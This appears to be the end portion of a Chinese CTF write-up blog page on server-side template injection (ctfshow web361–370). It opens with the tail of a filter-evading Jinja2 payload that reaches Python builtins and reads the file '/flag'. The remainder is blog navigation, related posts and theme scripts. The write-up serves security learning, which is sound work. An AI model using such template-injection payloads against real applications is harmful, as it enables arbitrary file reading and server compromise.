class="built_in">dict</span>(getitem=a)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> built=(a,a,<span class="built_in">dict</span>(builtins=a)|join,a,a)|join()%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> x=(q|attr(ini)|attr(glo)|attr(geti))(built)%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> <span class="built_in">chr</span>=x.<span class="built_in">chr</span>%&#125;</span><br><span class="line">&#123;% <span class="built_in">set</span> file=<span class="built_in">chr</span>(４７)%2bchr(１０２)%2bchr(１０８)%2bchr(９７)%2bchr(１０３)%&#125;</span><br><span class="line">&#123;%<span class="built_in">print</span>(x.<span class="built_in">open</span>(file).read())%&#125;</span><br></pre></td></tr></table></figure></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://blog.g01den.top">g01den</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://blog.g01den.top/posts/4826d2ce.html">http://blog.g01den.top/posts/4826d2ce.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://blog.g01den.top" target="_blank">golden的部落阁</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Web/">Web</a></div><div class="post_share"><div class="social-share" data-image="https://s2.loli.net/2025/05/03/WC6qReAr3aKo287.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/posts/cf99ed43.html" title="从NSSCTF开始的复建之路"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://s2.loli.net/2025/03/26/xrS4V3bGRAsozXj.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">从NSSCTF开始的复建之路</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/posts/2bb7953f.html" title="部分CVE复现Web（1）"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://gitee.com/gou-dengyue/images/raw/master/picture301.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-06-17</div><div class="title">部分CVE复现Web（1）</div></div></a></div><div><a href="/posts/384200ef.html" title="SQL无列名注入"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://gitee.com/gou-dengyue/images/raw/master/picture5.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-03-03</div><div class="title">SQL无列名注入</div></div></a></div><div><a href="/posts/b856856d.html" title="ctfshow-ssrf"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://s2.loli.net/2024/09/26/buT9gPYUzlEpIce.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-09-26</div><div class="title">ctfshow-ssrf</div></div></a></div><div><a href="/posts/97a7dff3.html" title="ctfshow-信息搜集"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://gitee.com/gou-dengyue/images/raw/master/picture315.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-09-14</div><div class="title">ctfshow-信息搜集</div></div></a></div><div><a href="/posts/4fb535d6.html" title="ctfshow-反序列化"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://s2.loli.net/2024/12/09/vLoWKQMUB7eNaJq.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-09-17</div><div class="title">ctfshow-反序列化</div></div></a></div><div><a href="/posts/ad175165.html" title="ctfshow-文件包含"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://s2.loli.net/2024/12/09/UxuP4fcVCgLi5IH.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-11-24</div><div class="title">ctfshow-文件包含</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://thirdqq.qlogo.cn/headimg_dl?dst_uin=2082045221&amp;spec=640&amp;img_type=jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">g01den</div><div class="author-info__description">golden的部落阁</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">46</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">10</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#web361%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">web361：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web362%EF%BC%9A"><span class="toc-number">2.</span> <span class="toc-text">web362：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web364%EF%BC%9A"><span class="toc-number">3.</span> <span class="toc-text">web364：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web365%EF%BC%9A"><span class="toc-number">4.</span> <span class="toc-text">Web365：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web366%EF%BC%9A"><span class="toc-number">5.</span> <span class="toc-text">Web366：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web367%EF%BC%9A"><span class="toc-number">6.</span> <span class="toc-text">Web367：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web368%EF%BC%9A"><span class="toc-number">7.</span> <span class="toc-text">Web368：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web369%EF%BC%9A"><span class="toc-number">8.</span> <span class="toc-text">Web369：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web370%EF%BC%9A"><span class="toc-number">9.</span> <span class="toc-text">Web370：</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/4826d2ce.html" title="ctfshow-SSTI"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://s2.loli.net/2025/05/03/WC6qReAr3aKo287.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ctfshow-SSTI"/></a><div class="content"><a class="title" href="/posts/4826d2ce.html" title="ctfshow-SSTI">ctfshow-SSTI</a><time datetime="2025-05-03T15:19:26.000Z" title="发表于 2025-05-03 23:19:26">2025-05-03</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/cf99ed43.html" title="从NSSCTF开始的复建之路"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://s2.loli.net/2025/03/26/xrS4V3bGRAsozXj.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="从NSSCTF开始的复建之路"/></a><div class="content"><a class="title" href="/posts/cf99ed43.html" title="从NSSCTF开始的复建之路">从NSSCTF开始的复建之路</a><time datetime="2025-03-26T14:52:27.000Z" title="发表于 2025-03-26 22:52:27">2025-03-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/de34fe7b.html" title="【2024】HECTF-个人整理向"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://s2.loli.net/2024/12/09/DfPey5as3WvUC6n.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="【2024】HECTF-个人整理向"/></a><div class="content"><a class="title" href="/posts/de34fe7b.html" title="【2024】HECTF-个人整理向">【2024】HECTF-个人整理向</a><time datetime="2024-12-09T12:59:36.000Z" title="发表于 2024-12-09 20:59:36">2024-12-09</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/ad175165.html" title="ctfshow-文件包含"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://s2.loli.net/2024/12/09/UxuP4fcVCgLi5IH.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ctfshow-文件包含"/></a><div class="content"><a class="title" href="/posts/ad175165.html" title="ctfshow-文件包含">ctfshow-文件包含</a><time datetime="2024-11-24T13:38:01.000Z" title="发表于 2024-11-24 21:38:01">2024-11-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/d1a08bca.html" title="pwn学习笔记（12）--Chunk Extend and Overlapping"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://s2.loli.net/2024/11/11/Jh79NkdRlY2wZuS.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="pwn学习笔记（12）--Chunk Extend and Overlapping"/></a><div class="content"><a class="title" href="/posts/d1a08bca.html" title="pwn学习笔记（12）--Chunk Extend and Overlapping">pwn学习笔记（12）--Chunk Extend and Overlapping</a><time datetime="2024-11-11T11:51:40.000Z" title="发表于 2024-11-11 19:51:40">2024-11-11</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2025 By g01den</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text"><a target="_blank" rel="noopener" href="https://beian.miit.gov.cn">蜀ICP备2024083302号</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload@17.8.8/dist/lazyload.iife.min.js"></script><div class="js-pjax"></div><div class="aplayer no-destroy" data-id="12208257400" data-server="netease" data-type="playlist"   data-order="list" data-fixed="true" data-preload="auto" data-autoplay="false" data-mutex="true" ></div><canvas class="fireworks" mobile="true"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/fireworks.min.js"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/metingjs/dist/Meting.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div><!-- hexo injector body_end start --><div class="js-pjax"><script async="async">var arr = document.getElementsByClassName('recent-post-item');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__zoomIn');
+    arr[i].setAttribute('data-wow-duration', '1.5s');
+    arr[i].setAttribute('data-wow-delay', '200ms');
+    arr[i].setAttribute('data-wow-offset', '30');
+    arr[i].setAttribute('data-wow-iteration', '1');
+  }</script><script async="async">var arr = document.getElementsByClassName('card-widget');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__zoomIn');
+    arr[i].setAttribute('data-wow-duration', '');
+    arr[i].setAttribute('data-wow-delay', '200ms');
+    arr[i].setAttribute('data-wow-offset', '');
+    arr[i].setAttribute('data-wow-iteration', '');
+  }</script><script async="async">var arr = document.getElementsByClassName('flink-list-card');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__flipInY');
+    arr[i].setAttribute('data-wow-duration', '3s');
+    arr[i].setAttribute('data-wow-delay', '');
+    arr[i].setAttribute('data-wow-offset', '');
+    arr[i].setAttribute('data-wow-iteration', '');
+  }</script><script async="async">var arr = document.getElementsByClassName('flink-list-card');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__animated');
+    arr[i].setAttribute('data-wow-duration', '3s');
+    arr[i].setAttribute('data-wow-delay', '');
+    arr[i].setAttribute('data-wow-offset', '');
+    arr[i].setAttribute('data-wow-iteration', '');
+  }</script><script async="async">var arr = document.getElementsByClassName('article-sort-item');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__slideInRight');
+    arr[i].setAttribute('data-wow-duration', '1.5s');
+    arr[i].setAttribute('data-wow-delay', '');
+    arr[i].setAttribute('data-wow-offset', '');
+    arr[i].setAttribute('data-wow-iteration', '');
+  }</script><script async="async">var arr = document.getElementsByClassName('site-card');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__flipInY');
+    arr[i].setAttribute('data-wow-duration', '3s');
+    arr[i].setAttribute('data-wow-delay', '');
+    arr[i].setAttribute('data-wow-offset', '');
+    arr[i].setAttribute('data-wow-iteration', '');
+  }</script><script async="async">var arr = document.getElementsByClassName('site-card');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__animated');
+    arr[i].setAttribute('data-wow-duration', '3s');
+    arr[i].setAttribute('data-wow-delay', '');
+    arr[i].setAttribute('data-wow-offset', '');
+    arr[i].setAttribute('data-wow-iteration', '');
+  }</script></div><script defer src="https://cdn.cbd.int/hexo-butterfly-wowjs/lib/wow.min.js"></script><script defer src="https://cdn.cbd.int/hexo-butterfly-wowjs/lib/wow_init.js"></script><!-- hexo injector body_end end --><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/"});</script></body></html>
